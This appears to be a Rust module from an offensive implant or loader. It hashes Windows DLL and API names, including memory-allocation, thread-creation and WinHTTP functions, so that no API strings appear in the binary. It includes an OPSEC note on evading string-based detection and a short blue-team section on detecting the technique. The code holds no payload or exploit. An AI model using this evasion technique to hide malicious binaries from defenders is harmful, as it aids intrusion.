//! API name hashing for string-free binaries
//!
//! Uses DJB2 hash algorithm to eliminate API name strings from binary.
//! Hash values computed at compile time via const fn.
//!
//! ## OPSEC
//! - No API name strings in binary
//! - Compile-time hash computation
//! - Resistant to string-based detection
//!
//! ## Detection (Blue Team)
//! - Look for DJB2 hash constants (5381 multiplier)
//! - PEB traversal patterns
//! - Dynamic API resolution without GetProcAddress strings

/// DJB2 hash algorithm - compile-time computable
pub const fn djb2_hash(name: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < name.len() {
        // Uppercase conversion for case-insensitive matching
        let c = if name[i] >= b'a' && name[i] <= b'z' {
            name[i] - 32
        } else {
            name[i]
        };
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
        i += 1;
    }
    hash
}

/// Runtime DJB2 hash for dynamic strings
pub fn djb2_hash_runtime(name: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &c in name {
        let c = if c >= b'a' && c <= b'z' { c - 32 } else { c };
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
    }
    hash
}

// Pre-computed module hashes (no strings in binary)
pub const KERNEL32_HASH: u32 = djb2_hash(b"KERNEL32.DLL");
pub const NTDLL_HASH: u32 = djb2_hash(b"NTDLL.DLL");
pub const WINHTTP_HASH: u32 = djb2_hash(b"WINHTTP.DLL");
pub const ADVAPI32_HASH: u32 = djb2_hash(b"ADVAPI32.DLL");
pub const USER32_HASH: u32 = djb2_hash(b"USER32.DLL");

// Pre-computed function hashes - Kernel32
pub const LOADLIBRARYA_HASH: u32 = djb2_hash(b"LoadLibraryA");
pub const GETPROCADDRESS_HASH: u32 = djb2_hash(b"GetProcAddress");
pub const VIRTUALALLOC_HASH: u32 = djb2_hash(b"VirtualAlloc");
pub const VIRTUALPROTECT_HASH: u32 = djb2_hash(b"VirtualProtect");
pub const VIRTUALFREE_HASH: u32 = djb2_hash(b"VirtualFree");
pub const CREATETHREAD_HASH: u32 = djb2_hash(b"CreateThread");
pub const WAITFORSINGLEOBJECT_HASH: u32 = djb2_hash(b"WaitForSingleObject");
pub const CLOSEHANDLE_HASH: u32 = djb2_hash(b"CloseHandle");
pub const GETLASTERROR_HASH: u32 = djb2_hash(b"GetLastError");
pub const SLEEP_HASH: u32 = djb2_hash(b"Sleep");
pub const EXITTHREAD_HASH: u32 = djb2_hash(b"ExitThread");
pub const EXITPROCESS_HASH: u32 = djb2_hash(b"ExitProcess");

// Pre-computed function hashes - WinHTTP
pub const WINHTTPOPEN_HASH: u32 = djb2_hash(b"WinHttpOpen");
pub const WINHTTPCONNECT_HASH: u32 = djb2_hash(b"WinHttpConnect");
pub const WINHTTPOPENREQUEST_HASH: u32 = djb2_hash(b"WinHttpOpenRequest");
pub const WINHTTPSENDREQUEST_HASH: u32 = djb2_hash(b"WinHttpSendRequest");
pub const WINHTTPRECEIVERESPONSE_HASH: u32 = djb2_hash(b"WinHttpReceiveResponse");
pub const WINHTTPREADDATA_HASH: u32 = djb2_hash(b"WinHttpReadData");
pub const WINHTTPCLOSEHANDLE_HASH: u32 = djb2_hash(b"WinHttpCloseHandle");

// Pre-computed function hashes - ntdll
pub const NTPROTECTVIRTUALMEMORY_HASH: u32 = djb2_hash(b"NtProtectVirtualMemory");
pub const NTALLOCATEVIRTUALMEMORY_HASH: u32 = djb2_hash(b"NtAllocateVirtualMemory");
pub const NTFREEVIRTUALMEMORY_HASH: u32 = djb2_hash(b"NtFreeVirtualMemory");
pub const RTLGETVERSION_HASH: u32 = djb2_hash(b"RtlGetVersion");

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_djb2_hash_consistency() {
        // Verify hash is deterministic
        assert_eq!(djb2_hash(b"KERNEL32.DLL"), KERNEL32_HASH);
        assert_eq!(djb2_hash(b"kernel32.dll"), KERNEL32_HASH); // Case insensitive
    }

    #[test]
    fn test_djb2_runtime_matches_const() {
        assert_eq!(djb2_hash_runtime(b"KERNEL32.DLL"), KERNEL32_HASH);
        assert_eq!(djb2_hash_runtime(b"LoadLibraryA"), LOADLIBRARYA_HASH);
    }

    #[test]
    fn test_known_hash_values() {
        // These can be used for YARA signatures
        assert_eq!(KERNEL32_HASH, 0x6DDB9555);
        assert_eq!(NTDLL_HASH, 0x1EDAB0ED);
    }

    #[test]
    fn test_different_strings_different_hashes() {
        assert_ne!(KERNEL32_HASH, NTDLL_HASH);
        assert_ne!(LOADLIBRARYA_HASH, GETPROCADDRESS_HASH);
    }
}
